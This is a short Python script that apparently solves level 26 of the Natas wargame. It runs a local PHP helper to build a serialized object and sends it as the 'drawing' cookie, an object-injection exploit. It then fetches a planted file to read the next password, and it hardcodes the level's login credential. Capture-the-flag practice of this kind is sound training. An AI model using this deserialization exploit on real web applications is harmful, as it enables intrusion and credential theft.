# -*- coding: utf-8 -*-
from base import get_page, post_page
import re
import requests
from subprocess import Popen, PIPE

def natas26():
    username="natas26"
    passowrd = "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T"
    
    stdout, stderr = Popen("php natas26.php", shell=True, stdout=PIPE, stderr=PIPE).communicate()
    if stderr:
        print("Fail to find password")
        return
    drawing = stdout.decode("utf-8").replace("\n","")

    cookies = {"drawing":drawing}
    get_page(26, username, passowrd, cookies=cookies)
    
    content = get_page(26, username, passowrd, "img/pass.php")
    print(content)

if __name__ == "__main__":
    natas26()